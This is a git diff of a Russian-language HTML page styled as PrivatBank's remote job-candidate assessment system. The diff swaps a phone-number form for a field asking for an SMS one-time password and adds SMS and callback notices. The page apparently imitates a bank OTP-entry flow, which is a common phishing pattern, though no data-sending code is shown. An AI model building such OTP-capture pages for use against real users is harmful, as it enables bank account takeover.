@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    <title>index</title>
+    <title>code</title>
 
     <link rel="preload" href="css/normalize.css" as="style" type="text/css">
     <link rel="preload" href="css/index.css" as="style" type="text/css">
@@ -36,14 +36,32 @@
         <p class="main__text --start">Добро пожаловать в систему дистанционной оценки кандидатов на работу в ПриватБанк.
             Пожалуйста, введите номер телефона, который Вы указали
             в резюме.</p>
-        <form id="form" class="main__form" method="POST" onSubmit="return false;">
-            <input type="tel" class="main__form__inputTel" name="tel" placeholder="+38 (___) ___-__-__" required>
+        <form class="main__form" method="POST" onSubmit="return false;">
+            <input type="number" class="main__form__inputNumber" name="tel" placeholder="Введите ОТП-пароль" required>
             <button type="submit" class="main__form__btn"><img src="img/next-copy.svg"
                     alt="изображение стрелки"></button>
         </form>
+        <div class="main__info">
+            <p class="main__info__number">На номер <span class="main__info__first__tel">+38(063) 111-22-33</span> был
+                отправлен SMS
+                пароль. Сообщение может прийти в Приват24,
+                Sender или в виде SMS сообщения.</p>
+            <p class="main__info__time">Через <span class="main__info__time__timer">1:30</span> Вы сможете
+                подтвердить вход
+                при помощи звонка.</p>
+            <p class="main__info__callMe">
+                <img src="img/phoneicon.svg" alt="иконка телефона">
+                <span>Позвоните мне</span>
+            </p>
+            <p class="main__info__callBank">
+                <span class="main__info__callBank__pulse">
+                    <img src="img/phoneicon.svg" alt="иконка телефона">
+                </span>
+                <span>Вас вызывает <br> +3809100011924</span>
+            </p>
+        </div>
     </main>
-
-    <script src="js/index.js" async></script>
+    <script src="js/code.js" async></script>
 </body>
 
 </html>
